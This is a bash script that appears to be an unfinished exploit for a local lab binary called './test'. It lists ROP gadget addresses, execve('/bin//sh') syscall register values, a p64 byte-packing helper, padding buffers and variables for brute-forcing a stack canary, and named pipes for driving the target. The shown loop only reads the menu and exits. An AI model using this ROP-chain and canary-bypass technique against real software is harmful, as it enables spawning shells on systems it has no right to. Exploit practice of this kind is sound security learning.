#!/bin/bash

if [[ -e payload_3_1 ]]; then
    rm payload_3_1
fi
if [[ -e payload_3_2 ]]; then
    rm payload_3_2
fi
if [[ -e payload_3_3 ]]; then
    rm payload_3_3
fi
if [[ -e input_pipe_03 ]]; then
    rm input_pipe_03
fi
if [[ -e output_pipe_03 ]]; then
    rm output_pipe_03
fi


: << ROPGadgets

0x0000000000451064: push rsp; ret;
0x000000000042d6ce: push rdi; ret;
0x00000000004c2926: push rsi; ret;
0x00000000004d1ace: push rbp; ret;
0x000000000044b78f: push rbx; ret;

0x00000000004005cf: pop rax; ret;
0x0000000000400ad8: pop rbp; ret;
0x0000000000400f48: pop rbx; ret;
0x00000000004006c6: pop rdi; ret;
0x000000000044c2a6: pop rdx; ret;
0x0000000000410893: pop rsi; ret;
0x0000000000401f13: pop rsp; ret;

0x0000000000488931: mov qword ptr [rsi], rax; ret;
0x000000000044707b: mov qword ptr [rdi], rsi; ret;
0x0000000000435693: mov qword ptr [rdi], rdx; ret;
0x000000000043538b: mov qword ptr [rdi], rcx; ret;

0x0000000000422113: cdq; ret;

0x00000000004013ec: syscall;

ROPGadgets

: << Values

0x68732f2f6e69622f:   "/bin//sh"   <- rdi
0x0000000000000000:   0             = rsi, rdx
0x000000000000003b:   59            = rax

Values


p64() {
    # Remove the '0x' prefix if present
    local hex=${1#0x}
    # Pad the hex string to ensure it's 16 characters, 8 bytes long
    while [ ${#hex} -lt 16 ]; do
        hex="0$hex"
    done
    # Reverse the bytes and format as a little-endian string
    local le=""
    for (( i=0; i<${#hex}; i+=2 )); do
        le="\\x${hex:$i:2}$le"
    done
    # Echo the result
    echo -ne "$le"
}


mkfifo input_pipe_03
mkfifo output_pipe_03

safe_stack_buf=$(printf "\x01%0.s" $(seq 1 24))

canary=""
declare -i canary_len=0
declare -i byte_int_try=0

cover_rbp=$(printf "\x01%0.s" $(seq 1 8))



# ./test < input_pipe_03 > output_pipe_03 2>&1 &

./test < input_pipe_03 | \
while IFS= read -r line; do
    echo $line
    if [[ $line == *"3. stop create child and get out"* ]]; then
        echo -e "3" > input_pipe_03
        break
    fi
done

rm input_pipe_03
rm output_pipe_03


